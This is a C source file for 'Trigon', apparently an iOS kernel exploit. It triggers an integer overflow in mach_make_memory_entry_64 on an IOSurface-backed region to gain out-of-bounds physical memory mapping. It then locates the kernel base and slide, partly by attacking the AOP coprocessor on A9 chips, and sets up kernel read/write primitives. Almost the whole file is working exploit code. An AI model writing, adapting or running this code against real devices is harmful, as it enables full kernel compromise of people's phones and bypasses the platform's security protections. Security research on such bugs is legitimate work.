// exploit.c
// Trigon, 2025

#include "exploit.h"
#include "info.h"
#include "memory.h"
#include "patchfinder.h"
#include "iboot-handoff.h"
#include "pv.h"
#include "surface.h"
#include "translation.h"
#include "aop.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <IOSurface/IOSurfaceRef.h>

static CFNumberRef CFNUM(uint32_t value) {
    return CFNumberCreate(NULL, kCFNumberIntType, (void *)&value);
}

static int create_oob_entry(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    uint32_t w = 32, bpe = 32;
    
    memory_object_size_t size = w * w * bpe;
    
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(w));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(w));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(bpe));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM((uint32_t)size / w));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM((uint32_t)size));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    IOSurfaceRef surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == NULL) return -1;
    
    mach_port_t parentEntry = 0;
    mach_port_t task = mach_task_self();
    memory_object_offset_t base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    memset((void *)base, 0x41, size);
    
    int perms = VM_PROT_DEFAULT;
    IOSurfaceLock(surface, 0, NULL);
    int kr = mach_make_memory_entry_64(task, &size, base, perms, &parentEntry, 0);
    IOSurfaceUnlock(surface, 0, NULL);
    CFRelease(surface);
    if (kr != KERN_SUCCESS) return -1;
    
    uint64_t overflowedSize = 0x4000 - 0x8000;
    uint64_t overflowOffset = 0x8000;
    if ((uint64_t)overflowedSize + (uint64_t)overflowOffset > (uint64_t)size) {
        printf("WARNING: 0x%llX > 0x%llX\n", (uint64_t)overflowedSize + (uint64_t)overflowedSize, size);
    }
    kr = mach_make_memory_entry_64(task, &overflowedSize, overflowOffset, perms, &gExploitEntry, parentEntry);
    mach_port_deallocate(task, parentEntry);
    if (kr != KERN_SUCCESS | gExploitEntry == MACH_PORT_NULL) {
        return -1;
    }
    return 0;
}

bool is_kernel_base(uint64_t pa, uint64_t *base, uint64_t *slide) {
    if (physread32(pa) == MH_MAGIC_64
        && physread32(pa + 12) == MH_EXECUTE) {
        void *kheader = calloc(1, pages(1));
        physreadbuf(pa, kheader, pages(1));
        const struct mach_header *hdr = (struct mach_header *)kheader;
        const uint8_t *q = NULL;
        q = (uint8_t *)hdr + sizeof(struct mach_header_64);
        for (int i = 0; i < hdr->ncmds; i++) {
            const struct load_command *cmd = (struct load_command *)q;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (struct segment_command_64 *)q;
                if (!strcmp(seg->segname, "__TEXT")) {
                    if (seg->vmaddr >= 0xFFFFFFF007004000) {
                        if (base) *base = seg->vmaddr;
                        if (slide) *slide = seg->vmaddr - 0xFFFFFFF007004000;
                        free(kheader);
                        return true;
                    }
                }
            }
            q = q + cmd->cmdsize;
        }
        free(kheader);
    }
    return false;
}

uint64_t trigon(void) {
    bool supported = false;
    info_init(&supported);
    if (!supported) {
        printf("ERROR: unsupported device/version.\n");
        return -1;
    }
    
    // Trigger the bug and create a memory of size 0xFFFFFFFFFFFFC000
    if (create_oob_entry()) {
        printf("ERROR: failed to create malicious memory entry.\n");
        return -1;
    }

    uint64_t handoff = 0;
    uint32_t *mapped = NULL;
    for (;; handoff += pages(1)) {
        mapped = (uint32_t *)map_data_with_offset(handoff, pages(1), VM_PROT_READ);
        if (!mapped) continue;
        if (*mapped == IBOOT_HANDOFF_MAGIC) break;
        unmap_data((uint64_t)mapped, pages(1));
    }
    uint64_t handoffBase = 0, aopBase = 0, aopSize = 0;
    parse_iboot_handoff((void *)mapped, &gDeviceInfo.gPhysBase, &gDeviceInfo.gPhysSize, &handoffBase, &aopBase, &aopSize);
    unmap_data((uint64_t)mapped, pages(1));
    printf("gPhysBase: 0x%llX\n", gDeviceInfo.gPhysBase);
    printf("gPhysSize: 0x%llX\n", gDeviceInfo.gPhysSize);
    
    gMappingBase = handoffBase - handoff;
    printf("Mapping base: 0x%llX\n", gMappingBase);
    
    if (gDeviceInfo.iorvbar) { // A10(X), A11
        uint64_t iorvbar = map_page(gDeviceInfo.iorvbar, VM_PROT_READ);
        volatile uint64_t iorvbarValue = *(volatile uint64_t *)iorvbar;
        printf("IORVBAR: 0x%llX\n", iorvbarValue);
        unmap_page(iorvbar);
        uint64_t kernelPage = iorvbarValue & 0xFFFFFF800;
        for (uint64_t pa = kernelPage;; pa -= pages(1)) {
            if (is_kernel_base(pa, &gDeviceInfo.kernelBase, &gDeviceInfo.kernelSlide)) {
                gDeviceInfo.kernelPhysBase = pa;
                break;
            }
        }
    } else if (gDeviceInfo.aop) { // A9(X)
        printf("Pwning the AOP...\n");
        if (aop_init(aopBase, aopSize) != 0) {
            printf("ERROR: failed to initialise AOP primitives.\n");
            if (gExploitEntry) {
                mach_port_deallocate(mach_task_self(), gExploitEntry);
                gExploitEntry = MACH_PORT_NULL;
            }
            return -1;
        }
        for (uint64_t i = 0x802000000; i < 0x806000000; i += pages(1)) {
            if (aop_physread32(i) == MH_MAGIC_64) {
                if (is_kernel_base(i, &gDeviceInfo.kernelBase, &gDeviceInfo.kernelSlide)) {
                    gDeviceInfo.kernelPhysBase = i;
                    break;
                }
            }
        }
        if (!gDeviceInfo.kernelPhysBase) {
            for (uint64_t i = gDeviceInfo.gPhysBase; i < gDeviceInfo.gPhysBase + gDeviceInfo.gPhysSize && (i < 0x802000000 || i > 0x806000000); i += pages(1)) {
                if (aop_physread32(i) == MH_MAGIC_64) {
                    if (is_kernel_base(i, &gDeviceInfo.kernelBase, &gDeviceInfo.kernelSlide)) {
                        gDeviceInfo.kernelPhysBase = i;
                        break;
                    }
                }
            }
        }
        aop_deinit();
    } else {
        printf("ERROR: no method to find kernel base.\n");
        if (gExploitEntry) {
            mach_port_deallocate(mach_task_self(), gExploitEntry);
            gExploitEntry = MACH_PORT_NULL;
        }
        return -1;
    }

    printf("Kernel base: 0x%llX\n", gDeviceInfo.kernelBase);
    printf("Kernel physical base: 0x%llX\n", gDeviceInfo.kernelPhysBase);
    printf("Kernel slide: 0x%llX\n", gDeviceInfo.kernelSlide);
    
    if (find_kernel_offsets()) {
        printf("ERROR: failed to patchfind kernel.\n");
        if (gExploitEntry) {
            mach_port_deallocate(mach_task_self(), gExploitEntry);
            gExploitEntry = MACH_PORT_NULL;
        }
        return -1;
    }
    
    uint64_t task = 0;
    int retries = 0;
    while (!task) {
        if (iosurface_krw_init(&task)) {
            printf("WARNING: failed to initialise IOSurface kernel read/write, retrying...\n");
            if (retries >= 20) {
                printf("ERROR: failed to initialise IOSurface kernel read/write after five retries, exiting.\n");
                if (gExploitEntry) {
                    mach_port_deallocate(mach_task_self(), gExploitEntry);
                    gExploitEntry = MACH_PORT_NULL;
                }
                return -1;
            }
            retries++;
        }
    }
    
    if (gExploitEntry) {
        mach_port_deallocate(mach_task_self(), gExploitEntry);
        gExploitEntry = MACH_PORT_NULL;
    }

    printf("kread32(0x%llX) -> 0x%X\n", gDeviceInfo.kernelBase, kread32(gDeviceInfo.kernelBase));
    
    iosurface_krw_deinit();
    
    return 0;
}
